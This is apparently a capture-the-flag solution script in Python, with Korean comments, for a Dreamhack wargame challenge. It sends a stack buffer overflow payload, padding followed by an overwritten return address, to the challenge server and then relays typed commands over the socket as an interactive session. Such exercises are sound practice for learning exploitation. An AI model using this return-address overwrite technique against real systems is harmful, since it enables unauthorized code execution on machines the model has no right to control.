import socket

# 서버의 호스트와 포트 설정
host = 'host3.dreamhack.games'
port = 11521

# 소켓 객체 생성 및 연결
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# 서버로부터 데이터를 받기 위한 'Input: ' 문자열 기다리기
data = s.recv(1024)
while b'Input: ' not in data:
    data += s.recv(1024)

print("recv Input success")

# 페이로드 생성
payload = b'A' * 0x30
payload += b'B' * 0x08
payload += b'\xaa\x06\x40\x00\x00\x00\x00\x00'

print(f"payload : {payload}")

# 페이로드 전송
s.sendall(payload + b'\n')

# 익스플로잇 후 서버와의 상호작용을 위해 데이터 받기
while True:
    print("interactive mode")
    data = s.recv(1024)
    if not data:
        print("there is no data recved")
        break
    print("data :")
    print(data.decode(), end='')

    # 사용자 입력을 받아 서버로 전송
    inp = input()
    s.sendall(inp.encode() + b'\n')

# 소켓 종료
s.close()

